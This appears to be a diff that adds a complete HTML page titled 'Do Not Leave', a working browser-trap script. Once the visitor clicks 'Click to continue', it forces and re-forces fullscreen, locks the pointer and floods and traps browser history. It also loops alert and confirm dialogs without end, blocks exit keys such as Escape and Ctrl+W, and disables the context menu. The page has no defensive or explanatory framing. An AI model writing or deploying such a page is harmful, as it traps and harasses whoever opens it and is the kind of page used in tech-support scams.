@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Do Not Leave</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    html, body {
+      margin: 0;
+      width: 100%;
+      height: 100%;
+      background: black;
+      color: white;
+      overflow: hidden;
+      font-family: monospace;
+      cursor: none;
+    }
+
+    #start {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      background: black;
+      z-index: 9999;
+    }
+
+    button {
+      padding: 20px 40px;
+      font-size: 18px;
+      background: #111;
+      color: white;
+      border: 1px solid #333;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<div id="start">
+  <button id="enter">Click to continue</button>
+</div>
+
+<script>
+  const enter = document.getElementById("enter");
+  const start = document.getElementById("start");
+
+  function fullscreen() {
+    document.documentElement.requestFullscreen().catch(() => {});
+  }
+
+  function pointerLock() {
+    document.body.requestPointerLock?.();
+  }
+
+  function floodHistory() {
+    for (let i = 0; i < 50; i++) {
+      history.pushState(null, "", location.href);
+    }
+  }
+
+  function alertLoop() {
+    setTimeout(() => {
+      alert("You are not done yet.");
+      alertLoop();
+    }, 3000);
+  }
+
+  function confirmLoop() {
+    setTimeout(() => {
+      if (!confirm("Are you sure you want to leave?")) {
+        confirmLoop();
+      } else {
+        confirmLoop();
+      }
+    }, 5000);
+  }
+
+  enter.onclick = () => {
+    start.remove();
+    fullscreen();
+    pointerLock();
+    floodHistory();
+    alertLoop();
+    confirmLoop();
+  };
+
+  // Re-enter fullscreen constantly
+  document.addEventListener("fullscreenchange", () => {
+    if (!document.fullscreenElement) {
+      setTimeout(fullscreen, 200);
+    }
+  });
+
+  // Trap back button
+  window.addEventListener("popstate", () => {
+    history.pushState(null, "", location.href);
+  });
+
+  // beforeunload dialog
+  window.addEventListener("beforeunload", (e) => {
+    e.preventDefault();
+    e.returnValue = "";
+  });
+
+  // Block exit keys (best effort)
+  document.addEventListener("keydown", (e) => {
+    const blocked =
+      e.key === "Escape" ||
+      e.key === "F11" ||
+      (e.ctrlKey && ["w", "W", "r", "R"].includes(e.key)) ||
+      (e.altKey && e.key === "Tab");
+
+    if (blocked) {
+      e.preventDefault();
+      e.stopPropagation();
+    }
+  });
+
+  // Pointer lock persistence
+  setInterval(() => {
+    if (document.hasFocus()) {
+      pointerLock();
+    }
+  }, 1000);
+
+  document.addEventListener("contextmenu", e => e.preventDefault());
+  document.addEventListener("dragstart", e => e.preventDefault());
+</script>
+
+</body>
+</html>
